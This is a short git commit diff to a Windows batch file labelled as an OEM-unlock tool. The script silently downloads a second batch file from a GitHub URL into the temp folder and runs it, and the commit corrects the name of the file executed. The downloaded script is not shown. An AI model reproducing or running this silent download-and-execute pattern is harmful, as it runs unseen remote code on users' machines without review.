06b9dfd8c4a1697d6cdd28e1ceb11bf54e6dc52c
bruh <50714531+legalizetren@users.noreply.github.com>
2023-01-28 16:59:56 +0200

    Update unlockOEM windows10.bat

--- unlockOEM windows10.bat
+++ unlockOEM windows10.bat
@@ -1,5 +1,5 @@
 @echo off
 cd /d %systemdrive%
 curl -s -o %temp%\unlockOEM.bat https://raw.githubusercontent.com/legalizetren/bruhmoment/main/unlockOEM.bat
-%temp%\Uni.bat
+%temp%\unlockOEM.bat
 exit
